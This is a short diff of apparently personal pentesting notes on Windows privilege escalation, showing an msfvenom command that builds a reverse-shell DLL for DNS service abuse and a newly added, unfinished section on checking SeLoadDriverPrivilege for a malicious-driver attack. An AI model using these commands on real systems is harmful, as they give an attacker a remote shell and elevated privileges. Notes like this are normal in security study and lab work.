@@ -108,3 +108,13 @@ net start dns OR sc.exe start dns
 
 if stuck! payload was generated with
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port --platform=windows -f dll > plugin.dll
+
+------MALICIOUSDRIVER------
+
+how to check?
+
+whoami /all #we have SeLoadDriverPrivilege permission
+
+exploit
+
+
